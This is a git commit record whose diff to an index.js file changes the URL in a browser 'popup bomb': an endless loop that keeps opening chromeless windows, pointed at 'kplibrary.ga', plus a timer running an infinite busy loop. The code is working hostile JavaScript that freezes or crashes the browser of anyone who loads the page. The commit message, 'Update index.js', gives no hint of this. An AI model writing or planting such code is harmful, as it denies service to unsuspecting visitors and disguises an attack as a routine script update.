f1cbaf6c5a2d5cc9c695fa6dee289faad2ff30c3
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 14:19:04 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,7 @@
+
 while(true)
 {
-window.open('http://Dr3w0623.github.io/repository.', '_blank', 'toolbar=0,location=0,menubar=0');
+window.open('kplibrary.ga', '_blank', 'toolbar=0,location=0,menubar=0');
 setTimeout(function(){
 for(var i = 0; i === i; i++) {}
 }, 50); 
